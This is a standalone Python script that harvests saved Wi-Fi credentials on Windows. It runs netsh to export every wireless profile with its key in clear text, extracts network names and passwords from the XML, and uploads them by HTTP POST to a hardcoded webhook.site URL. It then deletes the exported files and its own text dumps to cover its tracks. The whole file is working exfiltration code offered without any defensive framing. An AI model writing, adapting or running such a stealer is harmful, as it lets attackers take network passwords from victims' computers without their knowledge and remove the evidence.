import subprocess
import os
import xmltodict
import json
import requests

webhook = 'https://webhook.site/c4d8d81c-6151-4f41-b05e-383eed863b60'

wifi_files = []
wifi_names = ["NAMES"]
wifi_pass = ["PASSWORDS"]
command = subprocess.run(["netsh","wlan","export","profile","key=clear"],capture_output=True).stdout.decode()
path = os.getcwd()

def convert_xml_to_json(xml_file):
    with open(xml_file, 'rb') as file:
        # Read XML data from file
        xml_string = file.read()
    # Parse the XML data
    xml_dict = xmltodict.parse(xml_string)
    # Convert the XML dictionary to JSON
    json_data = json.dumps(xml_dict)
    return json_data

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        
for i in wifi_files:
    namedata = convert_xml_to_json(i)
    wifiname = json.loads(namedata)
    wifi_names.append(wifiname["WLANProfile"]["SSIDConfig"]["SSID"]["name"])
    with open('wifiNames.txt', 'w') as file:
    # Iterate over the array elements
        for element in wifi_names:
        # Write each element to a new line in the file
            file.write(str(element) + '\n')
    
for i in wifi_files:
    passdata = convert_xml_to_json(i)
    wifipass = json.loads(passdata)
    try:
        wifi_pass.append(wifipass["WLANProfile"]["MSM"]["security"]["sharedKey"]["keyMaterial"])
    except KeyError:
        wifi_pass.append("N/A")
    with open('wifiPass.txt', 'w') as file:
    # Iterate over the array elements
        for element in wifi_pass:
        # Write each element to a new line in the file
            file.write(str(element) + '\n')

with open('wifiNames.txt', 'rb') as f:
   r = requests.post(webhook,data=f)
with open('wifiPass.txt', 'rb') as f:
   r = requests.post(webhook,data=f)

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        os.remove(filename)

os.remove(path=os.getcwd() + "\wifiNames.txt")
os.remove(path=os.getcwd() + "\wifiPass.txt")